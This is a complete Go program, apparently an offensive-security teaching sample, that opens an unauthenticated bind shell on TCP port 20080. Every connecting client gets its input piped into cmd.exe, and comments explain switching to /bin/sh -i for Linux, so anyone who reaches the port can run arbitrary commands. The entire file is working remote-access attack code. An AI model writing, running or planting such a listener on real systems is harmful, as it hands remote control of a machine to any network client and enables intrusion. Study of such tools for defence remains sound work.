package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

/*
 * This command creates a listening server on port 20080.
 * Any remote client that connects, perhaps via Telnet,
 * would be able to execute arbitrary bash commands.
 * Read to Stdin, Write to Stdout
 */
func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * (change exec.Command("/bin/sh", "-i") for Linux)
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	cmd := exec.Command("cmd.exe")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	// links pipe reader to the connection
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
